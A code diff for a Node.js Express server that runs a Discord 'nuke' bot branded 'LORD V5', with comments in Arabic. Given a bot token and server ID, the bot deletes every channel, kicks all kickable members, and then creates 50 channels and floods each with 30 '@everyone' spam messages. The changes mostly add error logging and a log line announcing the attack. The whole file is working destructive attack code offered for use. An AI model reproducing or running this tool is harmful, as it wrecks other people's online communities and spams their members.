@@ -1,18 +1,15 @@
-const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
 const express = require('express');
 const bodyParser = require('body-parser');
-const path = require('path');
 
 const app = express();
 app.use(bodyParser.json());
 app.use(express.static('.'));
 
-app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
 app.post('/run-nuke', async (req, res) => {
     const { token, guildId, roomName, message, delChannels, kickMembers } = req.body;
 
-    // تفعيل كافة الصلاحيات (Intents) - هذا أهم جزء ليعمل البوت
+    // Intents كاملة وشاملة
     const client = new Client({ 
         intents: [
             GatewayIntentBits.Guilds, 
@@ -23,47 +20,49 @@ app.post('/run-nuke', async (req, res) => {
     });
 
     client.on('ready', async () => {
-        console.log(`[V5] البوت اشتغل: ${client.user.tag}`);
+        console.log(`[LOG] تم الدخول بواسطة: ${client.user.tag}`);
         
         try {
-            const guild = await client.guilds.fetch(guildId).catch(() => null);
-            if (!guild) return console.log("السيرفر غير موجود أو البوت مو فيه!");
+            const guild = await client.guilds.fetch(guildId);
+            if (!guild) return console.log("[ERROR] السيرفر غير موجود!");
 
-            // --- V5 SPEED EXECUTION ---
+            console.log(`[LOG] بدء الهجوم على سيرفر: ${guild.name}`);
 
-            // 1. حذف كل الرومات فوراً
+            // تنفيذ العمليات دفعة واحدة (Async)
             if (delChannels) {
-                guild.channels.cache.forEach(ch => ch.delete().catch(() => {}));
+                guild.channels.cache.forEach(ch => ch.delete().catch(e => console.log(`خطأ حذف: ${e.message}`)));
             }
 
-            // 2. طرد الأعضاء (للي رتبتهم أقل من البوت)
             if (kickMembers) {
                 guild.members.cache.forEach(m => {
-                    if (m.kickable) m.kick("Lord V5").catch(() => {});
+                    if (m.kickable) m.kick("Lord V5").catch(e => console.log(`خطأ طرد: ${e.message}`));
                 });
             }
 
-            // 3. إنشاء رومات وسبام (سرعة جنونية)
+            // إنشاء رومات وسبام
             for (let i = 0; i < 50; i++) {
                 guild.channels.create({
                     name: roomName || "nuked-by-lord",
                     type: ChannelType.GuildText
                 }).then(channel => {
-                    // إرسال 30 رسالة في كل روم يتم إنشاؤه
                     for (let j = 0; j < 30; j++) {
                         channel.send(message || "@everyone V5 HERE").catch(() => {});
                     }
-                }).catch(() => {});
+                }).catch(e => console.log(`خطأ إنشاء: ${e.message}`));
             }
 
         } catch (err) {
-            console.error("حدث خطأ:", err);
+            console.error("[ERROR] فشل الوصول للسيرفر:", err.message);
         }
     });
 
-    client.login(token).catch(() => console.log("التوكن خطأ!"));
-    res.json({ status: "ok" });
+    client.login(token).catch(err => {
+        console.error("[ERROR] التوكن مرفوض:", err.message);
+    });
+
+    res.json({ status: "started" });
 });
 
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
+app.listen(process.env.PORT || 3000, () => {
+    console.log("--- LORD V5 IS ACTIVE ---");
+});
